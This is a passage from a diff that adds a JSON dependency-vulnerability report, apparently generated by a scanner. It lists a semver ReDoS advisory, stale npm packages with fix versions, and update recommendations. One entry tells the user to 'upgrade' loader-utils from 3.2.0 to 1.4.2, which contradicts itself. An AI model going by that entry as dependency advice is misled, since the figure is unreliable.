+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20241025-0004"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2qf-rxjj-qqgw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25883"
+      ],
+      "summary": "semver vulnerable to Regular Expression Denial of Service",
+      "details": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-21T06:30:28Z",
+        "modifiedDate": "2024-12-06T20:34:31Z",
+        "daysSincePublished": 910
+      },
+      "affected": {
+        "package": "semver",
+        "version": "7.0.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.0.0",
+        "fixedIn": "7.5.2",
+        "recommendation": "Upgrade to 7.5.2 or later",
+        "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+        "daysSinceFix": 375,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/564"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/585"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/593"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/npm/node-semver"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js%23L97-L104"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js#L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/internal/re.js%23L160"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20241025-0004"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-SEMVER-3247795"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "brace-expansion",
+      "currentVersion": "1.1.11",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "braces",
+      "currentVersion": "3.0.2",
+      "fixedIn": "3.0.3",
+      "vulnerabilities": [
+        "GHSA-grv7-fg5c-xmjg"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.0.3 or later",
+      "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+      "daysSinceFix": 519,
+      "monthsSinceFix": 17,
+      "isOldFix": true
+    },
+    {
+      "package": "loader-utils",
+      "currentVersion": "3.2.0",
+      "fixedIn": "1.4.2",
+      "vulnerabilities": [
+        "GHSA-3rfm-jhwj-7488",
+        "GHSA-hhq3-ff78-jv3g"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.4.2 or later",
+      "fixAvailableSince": "2023-11-08T04:10:09.241Z",
+      "daysSinceFix": 770,
+      "monthsSinceFix": 25,
+      "isOldFix": true
+    },
+    {
+      "package": "micromatch",
+      "currentVersion": "4.0.2",
+      "fixedIn": "4.0.8",
+      "vulnerabilities": [
+        "GHSA-952p-6rrq-rcjv"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.0.8 or later",
+      "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+      "daysSinceFix": 476,
+      "monthsSinceFix": 15,
+      "isOldFix": true
+    },
+    {
+      "package": "nanoid",
+      "currentVersion": "3.3.4",
+      "fixedIn": "5.0.9",
+      "vulnerabilities": [
+        "GHSA-mwcw-c2x4-8c55"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.0.9 or later",
+      "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "postcss",
+      "currentVersion": "8.4.16",
+      "fixedIn": "8.4.31",
+      "vulnerabilities": [
+        "GHSA-7fh5-64p2-3v2j"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 8.4.31 or later",
+      "fixAvailableSince": "2025-11-04T16:45:01.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "rollup",
+      "currentVersion": "2.77.2",
+      "fixedIn": "3.29.5",
+      "vulnerabilities": [
+        "GHSA-gcx4-mw62-g8wm"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.29.5 or later",
+      "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+      "daysSinceFix": 446,
+      "monthsSinceFix": 14,
+      "isOldFix": true
+    },
+    {
+      "package": "semver",
+      "currentVersion": "5.7.1",
+      "fixedIn": "7.5.2",
+      "vulnerabilities": [
+        "GHSA-c2qf-rxjj-qqgw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.5.2 or later",
+      "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+      "daysSinceFix": 375,
+      "monthsSinceFix": 12,
+      "isOldFix": true
+    },
+    {
+      "package": "semver",
+      "currentVersion": "7.0.0",
+      "fixedIn": "7.5.2",
+      "vulnerabilities": [
+        "GHSA-c2qf-rxjj-qqgw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.5.2 or later",
+      "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+      "daysSinceFix": 375,
+      "monthsSinceFix": 12,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "HIGH",
+      "message": "7 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "10 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
